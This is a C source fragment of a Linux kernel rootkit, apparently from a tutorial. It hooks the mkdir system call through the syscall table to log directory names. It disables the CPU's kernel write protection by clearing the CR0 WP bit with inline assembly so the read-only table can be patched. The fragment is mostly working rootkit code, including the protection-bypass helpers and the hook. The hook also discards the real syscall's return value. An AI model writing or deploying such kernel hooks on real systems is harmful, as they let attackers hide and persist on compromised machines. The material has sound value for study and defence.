static unsigned long *__sys_call_table;

/* Despite what's written in include/linux/syscalls.h,
 * we have to declare the original syscall as taking
 * a single pt_regs struct as an argument. This enables
 * us to unpack this struct in our hook syscall and access
 * the arguments that are being passed, while still being
 * able to just pass this struct on again to the real syscall
 * without any issues. This way, we don't have to unpack
 * EVERY argument from the struct - only the ones we care about.
 *
 * Note that asmlinkage is used to prevent GCC from being
 * "helpful" by allocation arguments on the stack */
typedef asmlinkage long (*orig_mkdir_t)(const struct pt_regs *);
orig_mkdir_t orig_mkdir;

/* This is our function hook.
 *
 * Getting this to work is a little awkward. We have to un-pack
 * the arguments from the pt_regs struct in order to be able to
 * reference the new directory name without getting a null-pointer
 * dereference.
 *
 * The pt_regs struct contains all the arguments passed to the syscall
 * in each register. Looking up sys_mkdir, pathname is stored in rdi, so
 * simply dereferencing regs->di gives the pathname argument.
 * See arch/x86/include/asm/ptrace.h for more info.
 *
 * Note that we call the real sys_mkdir() function at the end */
asmlinkage int hook_mkdir(const struct pt_regs *regs) {
  char __user *pathname = (char *)regs->di;
  char dir_name[NAME_MAX] = {0};

  /* Copy the directory name from userspace (pathname, from
   * the pt_regs struct, to kernelspace (dir_name) so that we
   * can print it out to the kernel buffer */
  long error = strncpy_from_user(dir_name, pathname, NAME_MAX);

  if (error > 0)
    printk(KERN_INFO "rootkit: Trying to create directory with name: %s\n",
           dir_name);

  /* Pass the pt_regs struct along to the original sys_mkdir syscall */
  orig_mkdir(regs);
  return 0;
}

/* The built in linux write_cr0() function stops us from modifying
 * the WP bit, so we write our own instead */
inline void cr0_write(unsigned long cr0) {
  asm volatile("mov %0,%%cr0" : "+r"(cr0), "+m"(__force_order));
}

/* Bit 16 in the cr0 register is the W(rite) P(rotection) bit which
 * determines whether read-only pages can be written to. We are modifying
 * the syscall table, so we need to unset it first */
static inline void protect_memory(void) {
  unsigned long cr0 = read_cr0();
  set_bit(16, &cr0);
  cr0_write(cr0);
}

static inline void unprotect_memory(void) {
  unsigned long cr0 = read_cr0();
  clear_bit(16, &cr0);
  cr0_write(cr0);
}
